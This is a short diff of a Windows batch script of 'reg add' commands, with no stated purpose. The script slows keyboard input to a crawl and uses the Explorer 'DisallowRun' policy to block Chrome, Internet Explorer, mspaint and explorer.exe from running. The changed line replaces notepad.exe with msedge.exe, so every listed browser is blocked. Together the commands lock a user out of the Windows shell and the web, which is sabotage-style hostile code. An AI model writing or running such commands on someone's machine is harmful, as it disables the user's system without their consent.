@@ -12,7 +12,7 @@ reg add "HKCU\Control Panel\Keyboard" /v KeyboardDelay /t REG_SZ /d 2000 /f
 reg add "HKCU\Control Panel\Keyboard" /v KeyboardSpeed /t REG_SZ /d 1 /f
 reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v DisallowRun /t REG_DWORD /d 6 /f
 reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v 1 /t REG_SZ /d chrome.exe /f
-reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v 2 /t REG_SZ /d notepad.exe /f
+reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v 2 /t REG_SZ /d msedge.exe /f
 reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v 3 /t REG_SZ /d iexplore.exe /f
 reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v 4 /t REG_SZ /d explorer.exe /f
 reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v 5 /t REG_SZ /d mspaint.exe /f
